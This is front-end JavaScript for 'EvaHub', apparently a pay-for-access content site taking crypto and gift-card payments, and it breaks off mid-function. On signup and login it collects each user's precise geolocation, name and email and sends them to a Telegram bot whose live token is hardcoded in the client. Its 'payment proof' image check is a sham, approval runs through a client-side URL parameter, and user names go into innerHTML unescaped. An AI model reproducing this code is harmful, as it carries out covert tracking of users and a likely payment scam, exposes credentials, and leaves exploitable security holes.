// Initialize Icons universally with safety checks for webviews
if (typeof lucide !== 'undefined') {
  lucide.createIcons();
}

// DOM Helper Functions
const qs = s => document.querySelector(s);
const qsa = s => document.querySelectorAll(s);

// Vital Elements
const app = qs('#app');
const main = qs('#main');
const topbar = qs('#topbar');
const sidebar = qs('#sidebar');
const menuBtn = qs('#menuBtn');
const closeMenuBtn = qs('#closeMenuBtn');
const authSection = qs('#auth');

const inputName = qs('#inputName');
const inputEmail = qs('#inputEmail');
const createBtn = qs('#createBtn');
const logoutBtn = qs('#logoutBtn');

const displayName = qs('#displayName');
const topAvatar = qs('#topAvatar');
const sideName = qs('#sideName');
const sideEmail = qs('#sideEmail');
const sideAvatar = qs('#sideAvatar');
const dashName = qs('#dashName');

const inviteLinkInput = qs('#inviteLink');
const copyInvite = qs('#copyInvite');

const btcAddr = qs('#btcAddr');
const usdtAddr = qs('#usdtAddr');
const copyBtc = qs('#copyBtc');
const copyUsdt = qs('#copyUsdt');

const modal = qs('#modal');
const modalClose = qs('#modalClose');
const confirmPaid = qs('#confirmPaid');
const iHavePaidBtn = qs('#iHavePaidBtn');
const step1Actions = qs('#step1Actions');
const step2Actions = qs('#step2Actions');
const paymentMethodSelect = qs('#paymentMethodSelect');
const cryptoPayBtn = qs('#cryptoPayBtn');
const giftCardPayBtn = qs('#giftCardPayBtn');
const giftCardType = qs('#giftCardType');
const giftCardNumber = qs('#giftCardNumber');
const giftCardAmount = qs('#giftCardAmount');
const modalTitle = qs('#modalTitle');
const modalBody = qs('#modalBody');
const modalGiftCardType = qs('#modalGiftCardType');
const modalGiftCardCode = qs('#modalGiftCardCode');
const modalGiftCardAmt = qs('#modalGiftCardAmt');

// Environment Configuration Loader
// Note: In browser environment, process.env is not available
// For production, these values should be injected at build time
const config = {
  TELEGRAM_BOT_TOKEN: '8250901527:AAFZt9PFfjtw7S4Yn83aH8X6s02q3oW0ZUs',
  TELEGRAM_CHAT_ID: '52504489',
  // username (without @) that admins use on Telegram; used for direct links
  TELEGRAM_ADMIN_USERNAME: 'Sqyas6',
  BTC_ADDRESS: 'bc1q869e5h8kk4w55v586mz3f99pg5c8czwjkj3gdh',
  USDT_ADDRESS: 'TX7YRCwUBZAjqEJEJV2fmEggG3SehQkFQS',
  APP_NAME: 'EvaHub',
  APP_VERSION: '1.0.0',
  HOST_URL: 'https://evahub.netlify.app',
  BACKEND_URL: 'https://evahub.netlify.app' // adjust if backend is elsewhere
};

// tier requirements used by renderState logic
const TIER_REQUIREMENTS = {
  0: { name: 'Standard', minPoints: 0 },
  1: { name: 'Tier 1', minPoints: 10 },
  2: { name: 'Tier 2', minPoints: 20 },
  3: { name: 'Elite', minPoints: 30 }
};

// Legacy variables for backward compatibility
const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
const TELEGRAM_API = 'https://api.telegram.org/bot';

// ===== TELEGRAM DEBUG SETUP =====
// Call this in browser console to get your correct chat ID:
// await getTelegramChatId()
async function getTelegramChatId() {
  console.log('[TELEGRAM-SETUP] Fetching bot updates to find chat ID...');
  const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/getUpdates`;
  
  try {
    const response = await fetch(url);
    const data = await response.json();
    
    console.log('[TELEGRAM-SETUP] Full API Response:', data);
    
    if (!data.ok) {
      console.error('[TELEGRAM-SETUP] ❌ API Error:', data.description);
      return null;
    }
    
    if (data.result && data.result.length === 0) {
      console.warn('[TELEGRAM-SETUP] ⚠️  No updates found. Send a message to your bot first!');
      console.log('[TELEGRAM-SETUP] Bot username: @EvaHubBot (or search for bot token)');
      return null;
    }
    
    // Get the most recent update
    const latestUpdate = data.result[data.result.length - 1];
    const chatId = latestUpdate.message?.chat?.id || latestUpdate.callback_query?.from?.id;
    
    if (chatId) {
      console.log('[TELEGRAM-SETUP] ✅ FOUND CHAT ID:', chatId);
      console.log('[TELEGRAM-SETUP] Update the config with:');
      console.log(`  config.TELEGRAM_CHAT_ID = '${chatId}';`);
      console.log(`  TELEGRAM_CHAT_ID = '${chatId}';`);
      console.log('[TELEGRAM-SETUP] Or update src/app.js line with the correct ID');
      return chatId;
    } else {
      console.error('[TELEGRAM-SETUP] ❌ Could not extract chat ID from updates');
      console.log('[TELEGRAM-SETUP] Raw updates:', data.result);
      return null;
    }
  } catch (error) {
    console.error('[TELEGRAM-SETUP] Network error:', error);
    return null;
  }
}

// Auto-call on page load to check and log current status
window.addEventListener('DOMContentLoaded', () => {
  console.log('[TELEGRAM-SETUP] ========================================');
  console.log('[TELEGRAM-SETUP] EvaHub Telegram Configuration');
  console.log('[TELEGRAM-SETUP] Bot Token:', config.TELEGRAM_BOT_TOKEN.substring(0, 15) + '...');
  console.log('[TELEGRAM-SETUP] Chat ID:', config.TELEGRAM_CHAT_ID);
  console.log('[TELEGRAM-SETUP] ========================================');
  console.log('[TELEGRAM-SETUP] 1. Send a message to your bot on Telegram');
  console.log('[TELEGRAM-SETUP] 2. Run: await getTelegramChatId()');
  console.log('[TELEGRAM-SETUP] 3. Copy the chat ID and update config');
  console.log('[TELEGRAM-SETUP] ========================================');
});

// Application State
let state = { name: null, email: null, invites: 0, tier: 0, videos: 0, referredBy: null, referrals: [], sessionId: null, hasSeenApproval: false };


// Track intended route for protected pages (for handling login-then-redirect flow)
let intendedRoute = null;

// helper: show or remove a small pending message on dashboard
function updatePendingNotice() {
  const dashboard = qs('#dashboard');
  if (!dashboard) return;
  let notice = qs('#pendingNotice');
  const myPending = pendingApprovals.find(p => p.user === state.name);
  if (myPending) {
    if (!notice) {
      notice = document.createElement('div');
      notice.id = 'pendingNotice';
      notice.style.cssText = 'background: rgba(255,255,255,0.05); padding: 12px 20px; margin: 10px 0; border-left: 4px solid var(--accent-main);';
      dashboard.insertBefore(notice, dashboard.firstElementChild.nextSibling);
    }
    notice.innerHTML = `⏳ <strong>Payment pending for ${myPending.planTitle}</strong> <button id="cancelNoticeBtn" class="btn secondary" style="font-size:12px; padding:4px 8px; margin-left:10px;">Cancel</button>`;
    const cancelBtn = qs('#cancelNoticeBtn');
    if (cancelBtn) cancelBtn.addEventListener('click', cancelPending);
  } else if (notice) {
    notice.remove();
  }
}

// cancel pending payment routine
function cancelPending() {
  const myPending = pendingApprovals.find(p => p.user === state.name);
  if (!myPending) return;
  pendingApprovals = pendingApprovals.filter(p => p.user !== state.name);
  save();
  alert('✅ Your pending payment has been cancelled.');
  // hide modal if visible
  if (modal) modal.classList.add('hidden');
  updatePendingNotice();
}
let currentPurchasePlan = null;
let currentPaymentMethod = 'crypto'; // Track payment method

// Approval tracking (persisted in localStorage)
let pendingApprovals = [];
let approvedContent = {}; // map username -> approval record

// Session cache: store snapshot of every login on this device
let sessionCache = {}; // keyed by sessionId

// list of access URLs to grant on approval
const ACCESS_LINKS = [
  'https://tinyurl.com/Paradisse1',
  'https://tinyurl.com/Paradisse2',
  'https://tinyurl.com/Paradisse3',
  'https://tinyurl.com/Paradisse4',
  'https://tinyurl.com/Paradisse5',
  'https://tinyurl.com/Paradisse6',
  'https://tinyurl.com/Paradisse7',
  'https://tinyurl.com/Paradisse8'
];

// utility to show a modal list of access links
function displayAccessLinks(links) {
  if (!links || links.length === 0) return;
  let listHtml = '<ul style="text-align:left; padding-left:20px;">';
  links.forEach(l => { listHtml += '<li><a href="' + l + '" target="_blank" style="color:var(--accent-main);">' + l + '</a></li>'; });
  listHtml += '</ul>';
  qs('#modalTitle').textContent = '🎉 Access Granted';
  qs('#modalBody').innerHTML = '<p style="color:var(--text-muted);">Click any of the links below to access your content:</p>' + listHtml;
  step1Actions.classList.add('hidden');
  step2Actions.classList.add('hidden');
  modal.classList.remove('hidden');
}

// Broadcast channel for realtime approval notifications (simulates websocket)
let bc;
if ('BroadcastChannel' in window) {
  bc = new BroadcastChannel('evahub');
  bc.onmessage = (e) => {
    const msg = e.data;
    if (msg && msg.type === 'approval' && state.name && msg.user === state.name) {
      // show links immediately
      displayAccessLinks(msg.accessLinks);
      // mark we've seen approval and clear pending
      state.hasSeenApproval = true;
      pendingApprovals = pendingApprovals.filter(p => p.user !== state.name);
      updatePendingNotice();
    }
  };
}

function save() {
  localStorage.setItem('evahub_demo', JSON.stringify(state));
  localStorage.setItem('pendingApprovals', JSON.stringify(pendingApprovals));
  localStorage.setItem('approvedContent', JSON.stringify(approvedContent));
  // update session cache entry
  if (state.sessionId) {
    sessionCache[state.sessionId] = { ...state, lastSaved: Date.now() };
    localStorage.setItem('sessionCache', JSON.stringify(sessionCache));
  }
}
function load() {
  try {
    const s = localStorage.getItem('evahub_demo');
    if (s) {
      const parsed = JSON.parse(s);
      if (parsed && typeof parsed === 'object') {
        state = { ...state, ...parsed };
      }
    }
    const pa = localStorage.getItem('pendingApprovals');
    if (pa) pendingApprovals = JSON.parse(pa);
    const ac = localStorage.getItem('approvedContent');
    if (ac) approvedContent = JSON.parse(ac);
    const sc = localStorage.getItem('sessionCache');
    if (sc) sessionCache = JSON.parse(sc);
  } catch (e) {
    console.error("Local storage load failed", e);
  }
}
load();
console.log('sessionCache loaded:', sessionCache);

// apply any approval query parameter if present
function processApprovalParameter() {
  try {
    const params = new URLSearchParams(window.location.search);
    const apprId = params.get('approve');
    if (apprId) {
      const idx = pendingApprovals.findIndex(p => p.id === apprId);
      if (idx !== -1) {
        const record = pendingApprovals.splice(idx,1)[0];
        // when admin clicks approval, open proof image in new tab/window
        if (record.proofUrl) {
          try { window.open(record.proofUrl, '_blank'); } catch {};
        }
        // pick one random access URL from the pool for this user
        const chosenAccess = ACCESS_LINKS[Math.floor(Math.random() * ACCESS_LINKS.length)];
        approvedContent[record.user] = {
          user: record.user,
          planLink: record.planLink,
          planTitle: record.planTitle,
          accessLinks: [chosenAccess]
        };
        save();
        // show the single link to the admin (for confirmation)
        alert('✅ Payment approved for ' + record.user + '. Access link given: ' + chosenAccess);
        try { navigator.clipboard.writeText(chosenAccess); } catch {};
        // notify via Telegram with the actual access link the user will get
        // include note that proof is viewable via admin interface
        sendToTelegram('✅ PAYMENT APPROVED\nUser: ' + record.user + '\nPlan: ' + record.planTitle + '\nAccess Link: ' + chosenAccess + '\n(Proof available to admin)');
        // broadcast approval event to other tabs/clients (will include single link)
        if (bc) {
          bc.postMessage({ type: 'approval', user: record.user, link: record.planLink, planTitle: record.planTitle, accessLinks: [chosenAccess] });
        }
      }
    }
  } catch (_) {}
}
processApprovalParameter();

// ----------------------------------------------------
// Premium 3D Tilt Effect Logic (Performance Optimized)
// ----------------------------------------------------
function initTilt() {
  const cards = qsa('.tilt-effect');

  cards.forEach(card => {
    // Determine strictness (modals or heavy cards shouldn't tilt as aggressively)
    const isStrict = card.classList.contains('strict');
    const maxTilt = isStrict ? 4 : 10;

    card.addEventListener('mousemove', e => {
      // Avoid tilting on mobile for performance/UX reasons if window is narrow
      if (window.innerWidth < 768) return;

      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;

      const centerX = rect.width / 2;
      const centerY = rect.height / 2;

      const tiltX = ((y - centerY) / centerY) * -maxTilt;
      const tiltY = ((x - centerX) / centerX) * maxTilt;

      card.style.transform = `perspective(1200px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale3d(1.02, 1.02, 1.02)`;
      card.style.transition = 'none'; // disable transition during mouse move for instant snapping
    });

    card.addEventListener('mouseleave', () => {
      card.style.transform = `perspective(1200px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
      card.style.transition = 'transform 0.6s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.6s ease';
    });
  });
}

// ----------------------------------------------------
// State Rendering & Access Control
// ----------------------------------------------------
function renderState() {
  const isLogged = !!state.name;

  if (!isLogged) {
    // ENFORCED REQUIREMENT: The login must be absolutely first.
    // Setting `locked` hides the sidebar and topbar using CSS !important.
    app.classList.add('locked');
    topbar.classList.add('hidden');
    sidebar.classList.add('hidden');
    showSection('auth');
  } else {
    // Authorized Phase
    app.classList.remove('locked');
    topbar.classList.remove('hidden');
    sidebar.classList.remove('hidden');

    // Auto-redirect to intended route (or dashboard if none specified)
    const activeSec = qs('.section-view.active');
    if (activeSec && activeSec.id === 'auth') {
      const targetSection = intendedRoute || 'dashboard';
      showSection(targetSection);
      intendedRoute = null; // Clear after use
    }

    const initial = state.name.charAt(0).toUpperCase();

    // UI binding
    displayName.textContent = state.name;
    topAvatar.textContent = initial;
    sideName.textContent = state.name;
    dashName.textContent = state.name;
    sideAvatar.textContent = initial;
    sideEmail.textContent = state.email || 'No Email Registered';
    // debug: session info
    console.log('sessionId', state.sessionId, 'lastPaymentHash', state.lastPaymentHash);

    // if there is an approved record for this user, show them their link once
    if (approvedContent[state.name] && !state.hasSeenApproval) {
      const rec = approvedContent[state.name];
      // show entire link list if available (should be a single item now)
      if (rec.accessLinks) {
        displayAccessLinks(rec.accessLinks);
      } else {
        alert('✅ Your payment has been approved!\nAccess: ' + rec.planLink);
      }
      state.hasSeenApproval = true; // don't show again until next request
      // remove after showing once
      delete approvedContent[state.name];
      save();
    }

    // --- NEW: if the user still has a pending approval, remind them and lock UI
    const myPending = pendingApprovals.find(p => p.user === state.name);
    if (myPending) {
      // show modal with friendly pending message plus cancel control
      qs('#modalTitle').textContent = '⏳ Payment Pending';
      qs('#modalBody').innerHTML =
        `<p style="color:var(--text-muted);">Your payment for <strong>${myPending.planTitle}</strong> has been received and is awaiting admin approval.<br>` +
        'You can reload as many times as you like; the site will remember this state until your access is granted.</p>' +
        `<div style="margin-top:15px;">
           <a id="textAdminBtn" href="https://t.me/${config.TELEGRAM_ADMIN_USERNAME}" target="_blank" class="btn primary" style="margin-right:10px;">Text Admin</a>
           <button id="cancelPaymentBtn" class="btn secondary" style="margin-top:15px;">Cancel Payment</button>
         </div>`;
      step1Actions.classList.add('hidden');
      step2Actions.classList.add('hidden');
      modal.classList.remove('hidden');
      // attach listener to cancel button if not already set
      const cancelBtn = qs('#cancelPaymentBtn');
      if (cancelBtn) {
        cancelBtn.addEventListener('click', () => {
          cancelPending();
        });
      }
    }

    // Stats binding with looping numbers
    animateValue(qs('#totalInvites'), parseInt(qs('#totalInvites').textContent) || 0, state.invites, 1000);
    const tierName = TIER_REQUIREMENTS[state.tier]?.name || 'Standard';
    qs('#currentTier').textContent = tierName;
    animateValue(qs('#videosUnlocked'), parseInt(qs('#videosUnlocked').textContent) || 0, state.videos, 1000);
    
    // Calculate points to next tier
    const nextTier = state.tier + 1;
    const nextTierReq = TIER_REQUIREMENTS[nextTier]?.minPoints || 30;
    const pointsToNext = Math.max(0, nextTierReq - state.invites);
    animateValue(qs('#toNext'), parseInt(qs('#toNext').textContent) || 0, pointsToNext, 1000);
    
    // Auto-promote tier based on points
    for (let t = 3; t >= 1; t--) {
      if (state.invites >= TIER_REQUIREMENTS[t].minPoints) {
        state.tier = t;
        break;
      }
    }

    // Generate working invite link for all environments
    // prefer explicit host from config, fallback to current location

    // --- show dashboard pending indicator if needed
    updatePendingNotice();
    let hostUrl = config.HOST_URL || (window.location.origin + window.location.pathname);
    // if still using the original dev host, leave as config value so it can be switched easily
    if (hostUrl.includes('localhost') || hostUrl.includes('evahub.netlify.app') || window.location.protocol === 'file:') {
      hostUrl = config.HOST_URL; // change this env variable for production
    }
    // Ensure the URL ends with the file name for proper routing
    if (!hostUrl.includes('.html') && window.location.pathname !== '/') {
      hostUrl = hostUrl.replace(/\/$/, '') + '/index.html';
    }
    inviteLinkInput.value = `${hostUrl}?invite=${encodeURIComponent(state.name)}`;

    // Dynamically generate preview library items to simulate content
    const previewGrid = qs('#previewGrid');
    if (previewGrid && previewGrid.childElementCount === 0) {
      for (let i = 1; i <= 6; i++) {
        const d = document.createElement('div');
        d.className = 'card tilt-effect preview-card';
        d.innerHTML = `<strong>Course ${i}</strong><p>Short description of course ${i}.</p>`;
        previewGrid.appendChild(d);
      }
      if (typeof lucide !== 'undefined') lucide.createIcons();
      initTilt(); // Ensure newly added items gain the 3D property
    }
  }
}

// simple loading helper
function setLoading(btn, isLoading) {
  if (!btn) return;
  if (isLoading) {
    btn.dataset.orig = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Loading...';
  } else {
    btn.disabled = false;
    if (btn.dataset.orig) btn.innerHTML = btn.dataset.orig;
  }
}

// ----------------------------------------------------
// Core Navigation Framework
// ----------------------------------------------------
function showSection(id) {
  // Graceful DOM unmounting (CSS handles opacity and transform)
  qsa('.section-view').forEach(s => {
    s.classList.remove('active');
    setTimeout(() => {
      if (!s.classList.contains('active')) s.classList.add('hidden');
    }, 400); // 400ms delay to match css transition
  });

  // Graceful DOM mounting
  const target = qs('#' + id);
  if (target) {
    target.classList.remove('hidden');
    void target.offsetWidth; // Force reflow so animation triggers cleanly
    target.classList.add('active');
    
    // Initialize preview videos when preview section is shown
    if (id === 'preview') {
      setTimeout(() => {
        initPreviewVideos();
      }, 100);
    }
  }

  // Emphasize current menu path
  qsa('.menu li').forEach(li => li.classList.remove('active'));
  const activeLi = qs(`.menu li[data-show="${id}"]`);
  if (activeLi) activeLi.classList.add('active');
}

// Number loop animation logic
function animateValue(obj, start, end, duration) {
  if (start === end) {
    obj.innerHTML = end;
    return;
  }
  let startTimestamp = null;
  const step = (timestamp) => {
    if (!startTimestamp) startTimestamp = timestamp;
    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
    obj.innerHTML = Math.floor(progress * (end - start) + start);
    if (progress < 1) {
      window.requestAnimationFrame(step);
    } else {
      obj.innerHTML = end;
    }
  };
  window.requestAnimationFrame(step);
}

// Geolocation helper function
function getUserLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      resolve({ error: 'Geolocation not supported' });
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          
          console.log('[GEOLOCATION] Got coordinates:', { latitude, longitude });
          
          // Try to get location name using reverse geocoding
          try {
            const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`, {
              signal: AbortSignal.timeout(5000)
            });
            const data = await response.json();
            
            const location = {
              latitude: latitude.toFixed(4),
              longitude: longitude.toFixed(4),
              city: data.city || 'Unknown',
              country: data.countryName || 'Unknown',
              region: data.principalSubdivision || 'Unknown'
            };
            
            console.log('[GEOLOCATION] Reverse geocoding success:', location);
            resolve(location);
          } catch (geocodeError) {
            // Fallback to coordinates only if geocoding fails
            console.warn('[GEOLOCATION] Reverse geocoding failed, using coordinates only:', geocodeError.message);
            resolve({
              latitude: latitude.toFixed(4),
              longitude: longitude.toFixed(4),
              city: 'Unknown',
              country: 'Unknown',
              region: 'Unknown'
            });
          }
        } catch (error) {
          console.error('[GEOLOCATION] Error in position success handler:', error);
          resolve({ error: 'Failed to process location' });
        }
      },
      (error) => {
        let errorMsg = 'Unknown location';
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMsg = 'Location access denied by user';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMsg = 'Location unavailable';
            break;
          case error.TIMEOUT:
            errorMsg = 'Location request timeout';
            break;
        }
        console.warn('[GEOLOCATION] Position error:', errorMsg, error);
        resolve({ error: errorMsg });
      },
      {
        enableHighAccuracy: false,
        timeout: 10000,
        maximumAge: 300000 // 5 minutes
      }
    );
  });
}

// ----------------------------------------------------
// Interactive Binding and Listeners
// ----------------------------------------------------

createBtn.addEventListener('click', async () => {
  setLoading(createBtn, true);
  const name = inputName.value.trim();
  if (!name) {
    alert("Authentication Protocol: Please enter a Display Name to unlock access.");
    inputName.focus();
    return;
  }

  const email = inputEmail.value.trim();
  const isNewUser = !state.name; // Check if this is a new user

  state.name = name;
  state.email = email;
  if (!state.sessionId) {
    state.sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2,5);
  }

  // Get user location
  const location = await getUserLocation();
  const locationString = location.error 
    ? `📍 Location: ${location.error}`
    : `📍 Location: ${location.city}, ${location.region}, ${location.country} (${location.latitude}, ${location.longitude})`;

  // Process invite parameter - improved referral system
  let inv = null;
  try {
    // Try modern URL API first
    const url = new URL(window.location.href);
    inv = url.searchParams.get('invite');
  } catch (e) {
    // Fallback for older browsers or file:// protocol
    try {
      const params = new URLSearchParams(window.location.search);
      inv = params.get('invite');
    } catch (fallbackError) {
      // Last resort: manual parsing
      const search = window.location.search;
      const inviteMatch = search.match(/[?&]invite=([^&]*)/);
      if (inviteMatch) {
        inv = decodeURIComponent(inviteMatch[1]);
      }
    }
  }

  if (inv && inv.trim()) {
    // Clean up the invite parameter
    inv = inv.trim();
    // Prevent self-referral
    if (inv !== name) {
      state.referredBy = inv;
      // Only award points if this is the first time using this referral
      if (!state.referrals || !state.referrals.includes(inv)) {
        state.invites += 1;
        if (!state.referrals) state.referrals = [];
        state.referrals.push(inv);
        sendToTelegram('🎉 NEW REFERRAL SIGNUP\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n🔗 Referred By: ' + inv + '\\n⭐ Points: +1\\n' + locationString);
        alert('Welcome! You earned 1 point from the referral link. Continue inviting others to climb tiers!');
      } else {
        // Already used this referral, just welcome them
        alert('Welcome back! You\'ve already used this referral link.');
      }
    }
  } else if (isNewUser) {
    // New user signup notification
    sendToTelegram('🆕 NEW USER SIGNUP\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n' + locationString);
  } else {
    // Returning user login notification
    sendToTelegram('🔄 USER LOGIN\\n👤 Name: ' + name + '\\n📧 Email: ' + (email || 'N/A') + '\\n' + locationString);
  }

  save();
  renderState();
  setLoading(createBtn, false);
});

logoutBtn.addEventListener('click', () => {
  state = { name: null, email: null, invites: 0, tier: 0, videos: 0, referredBy: null, referrals: [] };
  save();
  inputName.value = '';
  inputEmail.value = '';
  renderState();
});

// Sidebar drawer orchestration
menuBtn.addEventListener('click', () => sidebar.classList.add('open'));
closeMenuBtn.addEventListener('click', () => sidebar.classList.remove('open'));

qsa('.menu li[data-show]').forEach(li => {
  li.addEventListener('click', (e) => {
    const target = e.currentTarget.getAttribute('data-show');
    showSection(target);
    sidebar.classList.remove('open'); // Retract sidebar on mobile tap
  });
});

copyInvite.addEventListener('click', () => {
  inviteLinkInput.select();
  inviteLinkInput.setSelectionRange(0, 99999);
  document.execCommand('copy');
  alert('Invite link copied to clipboard');
});

// Set crypto addresses from config
btcAddr.value = config.BTC_ADDRESS;
usdtAddr.value = config.USDT_ADDRESS;

copyBtc.addEventListener('click', () => copyToClp(btcAddr.value, 'Bitcoin Hash Copied.'));
copyUsdt.addEventListener('click', () => copyToClp(usdtAddr.value, 'USDT Contract Address Copied.'));

// Image Analysis for Payment Proof Detection
function analyzePaymentImage(file) {
  return new Promise((resolve) => {
    if (!file || !file.type.startsWith('image/')) {
      resolve({ valid: false, score: 0, reason: 'Not an image' });
      return;
    }
    const reader = new FileReader();
    reader.onload = (e) => {
      const img = new Image();
      img.onload = () => {
        try {
          const canvas = document.createElement('canvas');
          canvas.width = img.width;
          canvas.height = img.height;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(img, 0, 0);
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const data = imageData.data;
          let score = 0;
          if (img.width >= 300 && img.height >= 300) score += 2;
          if (file.size >= 50000) score += 2;
          let greenPx = 0, bluePx = 0;
          for (let i = 0; i < data.length; i += 4) {
            const r = data[i], g = data[i+1], b = data[i+2];
            if (g > r && g > b && g > 100) greenPx++;
            if (b > r && b > 50) bluePx++;
          }
          const totalPx = data.length / 4;
          score += Math.min((greenPx + bluePx) / totalPx * 10, 3);
          let varBright = 0;
          for (let i = 0; i < data.length; i += 4) {
            const bright = (data[i] + data[i+1] + data[i+2]) / 3;
            varBright += Math.abs(bright - 128);
          }
          if (varBright / (totalPx * 128) > 0.3) score += 2;
          resolve({ valid: score >= 5, score: Math.min(score, 10), reason: score >= 5 ? 'Valid payment detected' : 'Image quality low' });
        } catch (e) {
          resolve({ valid: false, score: 0, reason: 'Analysis error' });
        }
      };
      img.onerror = () => resolve({ valid: false, score: 0, reason: 'Invalid image' });
      img.src = e.target.result;
    };
    reader.readAsDataURL(file);
  });
}

// helper: take an image file or data URL and try to shrink it
// until its string length is below `maxLen`. returns a new dataURL or null.
function compressDataURL(dataUrl, maxLen = 1500) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      // scale down if too large
      let { width, height } = img;
      const maxDim = 400; // arbitrary limit for longest side
      if (width > maxDim || height > maxDim) {
        const scale = maxDim / Math.max(width, height);
        width = width * scale;
        height = height * scale;
      }
      canvas.width = width;
      canvas.height = height;
      ctx.drawImage(img, 0, 0, width, height);

      let quality = 0.6;
      function attempt() {
        const compressed = canvas.toDataURL('image/jpeg', quality);
        if (compressed.length <= maxLen || quality < 0.1) {
          resolve(compressed.length <= maxLen ? compressed : null);
        } else {
          quality -= 0.1;
          attempt();
        }
      }
      attempt();
    };
    img.onerror = () => resolve(null);
    img.src = dataUrl;
  });
}

// Function to resize image for compression
function resizeImage(file, maxWidth = 800, maxHeight = 800, quality = 0.7) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      let { width, height } = img;
      if (width > height) {
        if (width > maxWidth) {
          height = (height * maxWidth) / width;
          width = maxWidth;
        }
      } else {
        if (height > maxHeight) {
          width = (width * maxHeight) / height;
          height = maxHeight;
        }
      }
      canvas.width = width;
      canvas.height = height;
      ctx.drawImage(img, 0, 0, width, height);
      canvas.toBlob(resolve, 'image/jpeg', quality);
    };
    img.src = URL.createObjectURL(file);
  });
}

// ===== TELEGRAM INTEGRATION =====
// Sends messages and photos directly to Telegram Bot API from the frontend
// All data is logged to console for debugging
async function sendToTelegram(message, photoUrl = null) {
  const botToken = config.TELEGRAM_BOT_TOKEN;
  const chatId = config.TELEGRAM_CHAT_ID;

  // Validate inputs
  if (!botToken || !chatId) {
    console.error('[TELEGRAM] Missing bot token or chat ID in config', { botToken: !!botToken, chatId: !!chatId });
    return;
  }

  if (!message && !photoUrl) {
    console.warn('[TELEGRAM] No message or photo provided to sendToTelegram');
    return;
  }

  try {
    if (photoUrl) {
      // Send photo first
      console.log('[TELEGRAM] Sending photo...');
      const photoSuccess = await sendPhotoToTelegram(botToken, chatId, photoUrl, 'Payment Proof');
      
      // If photo sent successfully, send the message as follow-up
      if (photoSuccess && message) {
        console.log('[TELEGRAM] Photo sent successfully, now sending follow-up message...');
        await new Promise(resolve => setTimeout(resolve, 500)); // Small delay before follow-up
        await sendMessageToTelegram(botToken, chatId, message);
      }
    } else {
      // Send text message only
      await sendMessageToTelegram(botToken, chatId, message);
    }
  } catch (err) {
    console.error('[TELEGRAM] sendToTelegram exception:', err);
  }
}

async function sendMessageToTelegram(botToken, chatId, text) {
  const payload = {
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML'
  };

  console.log('[TELEGRAM-MSG] Preparing message:', {
    chat_id: payload.chat_id,
    text_length: text.length,
    text_preview: text.substring(0, 100),
    timestamp: new Date().toISOString()
  });

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  console.log('[TELEGRAM-MSG] API Endpoint:', url);

  const maxRetries = 3;
  const baseDelay = 1000;
  
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(`[TELEGRAM-MSG] Attempt ${attempt}/${maxRetries}...`);
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'cors',
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);
      console.log('[TELEGRAM-MSG] Response Status:', response.status, response.statusText);
      
      const data = await response.json();
      console.log('[TELEGRAM-MSG] Response Data:', data);

      if (data.ok) {
        console.log('[TELEGRAM-MSG] ✅ MESSAGE SENT SUCCESSFULLY', { message_id: data.result?.message_id, attempt });
        return true;
      } else {
        console.error('[TELEGRAM-MSG] ❌ FAILED:', data.description || 'Unknown error');
        if (response.status >= 400 && response.status < 500) {
          console.error('[TELEGRAM-MSG] Client error - not retrying');
          return false;
        }
      }
    } catch (error) {
      console.warn(`[TELEGRAM-MSG] Attempt ${attempt} failed:`, error.message);
      
      if (error.name === 'AbortError') {
        console.error('[TELEGRAM-MSG] ⏱️  REQUEST TIMEOUT (10 seconds)');
      } else {
        console.error('[TELEGRAM-MSG] Network error:', error.message);
      }
      
      if (attempt < maxRetries) {
        const delay = baseDelay * Math.pow(2, attempt - 1);
        console.log(`[TELEGRAM-MSG] Retrying in ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else {
        console.error('[TELEGRAM-MSG] All retries exhausted');
        console.error('[TELEGRAM-MSG] Error Details:', {
          name: error.name,
          message: error.message,
          type: error.name === 'AbortError' ? 'TIMEOUT' : 'NETWORK_ERROR'
        });
        return false;
      }
    }
  }
  
  return false;
}

async function sendPhotoToTelegram(botToken, chatId, photoUrl, caption) {
  console.log('[TELEGRAM-PHOTO] Preparing photo message:', {
    chat_id: chatId,
    photo_url: photoUrl?.substring(0, 50) + (photoUrl?.length > 50 ? '...' : ''),
    is_data_url: photoUrl?.startsWith('data:'),
    caption_length: caption?.length || 0,
    caption_preview: caption?.substring(0, 100),
    timestamp: new Date().toISOString()
  });

  const maxRetries = 2;
  const baseDelay = 1000;

  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(`[TELEGRAM-PHOTO] Attempt ${attempt}/${maxRetries}...`);
      
